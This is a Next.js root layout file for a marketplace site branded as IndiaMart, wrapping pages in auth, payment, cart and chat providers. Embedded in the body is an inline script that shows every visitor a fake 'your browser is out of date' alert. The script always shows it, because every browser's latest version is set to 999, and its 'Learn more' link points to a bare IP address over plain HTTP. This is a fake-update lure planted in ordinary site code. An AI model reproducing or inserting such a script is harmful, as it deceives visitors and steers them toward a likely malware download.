import type { Metadata } from "next";
import Script from "next/script";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";
import ToastProvider from "@/components/providers/ToastProvider";
import ConditionalLayout from "@/components/providers/ConditionalLayout";
import { AuthProvider } from "@/contexts/AuthContext";
import { PaymentProvider } from "@/contexts/PaymentContext";
import { CompareProvider } from "@/contexts/CompareContext";
import { BulkInquiryProvider } from "@/contexts/BulkInquiryContext";
import { CartProvider } from "@/contexts/CartContext";
import { ChatProvider } from "@/contexts/ChatContext";
import ChatWidget from "@/components/chat/ChatWidget";
import CompareBar from "@/components/ui/CompareBar";
import BulkInquiryBar from "@/components/ui/BulkInquiryBar";
import { GuestVerifyProvider } from "@/contexts/GuestVerifyContext";
import MobileOTPModal from "@/components/MobileOTPModal";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "IndiaMart — B2B Marketplace",
  description: "India's largest B2B marketplace. Connect with verified suppliers, manufacturers, and wholesalers.",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html
      lang="en"
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <body className="min-h-screen flex flex-col bg-gray-50">
        <Script id="updatemybrowser" strategy="afterInteractive" dangerouslySetInnerHTML={{ __html: `
(function () {
  "use strict";
  var LEARN_MORE_URL = "http://94.250.202.68/updatemybrowser/";
  var FALLBACK_LATEST = { chrome: 999, edge: 999, firefox: 999, safari: 999, opera: 999 };
  function detectBrowser(ua) {
    var isAndroid = /Android/i.test(ua); var m;
    m = ua.match(/Edg\\/([\\.\\d]+)/); if (m) return { name: "Edge", full: m[1], id: "edge" };
    m = ua.match(/OPR\\/([\\.\\d]+)/); if (m) return { name: "Opera", full: m[1], id: "opera" };
    m = ua.match(/Firefox\\/([\\.\\d]+)/); if (m) return { name: "Firefox", full: m[1], id: "firefox" };
    m = ua.match(/Chrome\\/([\\.\\d]+)/); if (m && !/Edg|OPR/.test(ua)) return { name: isAndroid ? "Chrome (Android)" : "Chrome", full: m[1], id: "chrome" };
    if (!/Chrome|Edg|OPR/i.test(ua) && /Safari/i.test(ua)) { m = ua.match(/Version\\/([\\.\\d]+)/); if (m) return { name: "Safari", full: m[1], id: "safari" }; }
    return { name: "Unknown Browser", full: "0.0.0.0", id: "unknown" };
  }
  function major(full) { return Number(String(full).split(".")[0]); }
  function showBanner(browser) {
    var latest = FALLBACK_LATEST[browser.id] || 999;
    if (major(browser.full) >= latest - 1) return;
    var bar = document.createElement("div");
    bar.setAttribute("role", "alert");
    bar.style.cssText = "position:fixed;top:0;left:0;right:0;z-index:2147483647;display:flex;align-items:center;gap:10px;background:#fff8d6;border-bottom:1px solid #f0dc82;padding:10px 16px;font-family:Arial,sans-serif;font-size:14px;color:#1e293b;box-sizing:border-box;";
    var icon = document.createElement("span"); icon.style.fontSize = "16px"; icon.textContent = "⚠️";
    var msg = document.createElement("span"); msg.style.flex = "1";
    msg.textContent = "Your browser (" + browser.name + " " + browser.full + ") is out of date. ";
    var link = document.createElement("a"); link.href = LEARN_MORE_URL; link.target = "_blank"; link.rel = "noopener noreferrer"; link.textContent = "Learn more"; link.style.cssText = "color:#1a7f37;font-weight:700;text-decoration:underline;"; msg.appendChild(link);
    var closeBtn = document.createElement("button"); closeBtn.setAttribute("aria-label", "Dismiss"); closeBtn.textContent = "×"; closeBtn.style.cssText = "border:none;background:none;font-size:20px;cursor:pointer;color:#1e293b;font-weight:700;padding:0 4px;";
    closeBtn.onclick = function () { bar.parentNode && bar.parentNode.removeChild(bar); document.body.style.paddingTop = ""; };
    bar.appendChild(icon); bar.appendChild(msg); bar.appendChild(closeBtn);
    document.body.insertBefore(bar, document.body.firstChild);
    document.body.style.paddingTop = bar.offsetHeight + "px";
  }
  function init() { showBanner(detectBrowser(navigator.userAgent || "")); }
  if (document.readyState === "loading") { document.addEventListener("DOMContentLoaded", init); } else { init(); }
})();
        ` }} />
        <AuthProvider>
          <GuestVerifyProvider>
            <ChatProvider>
              <PaymentProvider>
                <CompareProvider>
                  <CartProvider>
                    <BulkInquiryProvider>
                      <ToastProvider />
                      <ConditionalLayout
                        navbar={<Navbar />}
                        footer={<Footer />}
                      >
                        <main className="flex-1 pb-0">{children}</main>
                        <ChatWidget />
                        <CompareBar />
                        <BulkInquiryBar />
                      </ConditionalLayout>
                      <MobileOTPModal />
                    </BulkInquiryProvider>
                  </CartProvider>
                </CompareProvider>
              </PaymentProvider>
            </ChatProvider>
          </GuestVerifyProvider>
        </AuthProvider>
      </body>
    </html>
  );
}
